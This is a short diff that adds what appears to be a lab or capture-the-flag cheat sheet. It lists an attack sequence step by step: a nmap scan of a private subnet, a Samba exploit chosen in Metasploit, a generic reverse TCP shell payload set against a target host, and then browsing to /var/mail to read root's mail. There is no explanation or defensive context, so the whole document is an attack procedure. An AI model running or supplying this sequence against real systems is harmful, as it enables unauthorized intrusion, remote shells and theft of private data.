@@ -1,0 +1,20 @@
+-sudo su
+-ifconfig
+-nmap 172.20.10.12/28
+-msfconsole
+-search samba
+-use 69
+-options
+-set RHOST 172.20.10.13
+-set PAYLOAD generic/shell_reverse_tcp
+-run
+-CTRL+C 
+-N
+-pwd
+-cd..
+-ls
+-cd var
+-ls
+-cd mail
+-ls
+-cat root
